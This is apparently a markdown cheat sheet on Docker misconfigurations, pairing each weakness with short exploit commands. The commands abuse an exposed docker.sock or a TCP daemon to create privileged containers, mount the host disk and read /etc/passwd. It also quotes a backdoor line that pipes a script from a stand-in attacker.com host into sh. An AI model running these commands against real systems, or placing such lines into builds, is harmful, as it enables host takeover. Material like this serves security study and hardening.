
###   Exposed Docker API (`/var/run/docker.sock`)

#### ➤ **Vulnerability**:

The Docker socket (`/var/run/docker.sock`) gives root-level control over Docker. If it's exposed over a network or mounted into a container, an attacker can control Docker as **root**.

#### ➤ **Exploit**:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Or spawn a new root container:

```bash
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"HostConfig":{"Privileged":true}}' \
  http://localhost/containers/create
```

---

###   Privileged Containers

#### ➤ **Vulnerability**:

Running a container with `--privileged` grants **almost full access to the host** (devices, kernel modules, etc.).

#### ➤ **Exploit**:

Inside a privileged container:

```bash
# Access host devices
ls /dev

# Mount the host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

---

###  Insecure Volume Mounts

#### ➤ **Vulnerability**:

Sensitive host directories (like `/etc`, `/root`, or `/home`) mounted into a container can be accessed or modified.

#### ➤ **Exploit**:

```bash
docker run -v /etc:/mnt --rm -it alpine sh
cat /mnt/passwd
```

This allows reading system files or stealing credentials.

---

### Container Escape via Kernel Exploits

#### ➤ **Vulnerability**:

Containers share the host kernel. If an unpatched kernel exploit exists, a process inside a container can break out.

#### ➤ **Exploit Example**: DirtyPipe (CVE-2022-0847)

Used to write arbitrary data into read-only files like `/etc/passwd`.

Inside vulnerable container:

```bash
# Compile and run DirtyPipe exploit to modify /etc/passwd and create root user
```

---

###  Exposed Docker Daemon over TCP

#### ➤ **Vulnerability**:

If Docker is running with `-H tcp://0.0.0.0:2375` without TLS, it's fully exposed and unauthenticated.

#### ➤ **Exploit**:

```bash
# Connect and control remotely
docker -H tcp://target-ip:2375 ps
docker -H tcp://target-ip:2375 run -it alpine sh
```

This grants **remote root access** to the Docker host.

---

###  Image Poisoning / Malicious Images

#### ➤ **Vulnerability**:

Pulling images from untrusted sources may include malware or backdoors.

#### ➤ **Exploit**:

- Backdoor in Dockerfile (e.g., `curl attacker.com/shell.sh | sh`)
    
- Trojanized binaries in the image
    

**Defence**: Use verified sources or scan with `dockle`, `trivy`, or `docker scan`.

---

###  Unsafe Capabilities

#### ➤ **Vulnerability**:

By default, Docker grants capabilities that can be dangerous if misused.

#### ➤ **Exploit**:

Use `--cap-add=SYS_ADMIN` or similar to gain dangerous privileges:

```bash
docker run --cap-add=SYS_ADMIN -it ubuntu bash
```

This can allow mounting, pivoting, and potentially escaping.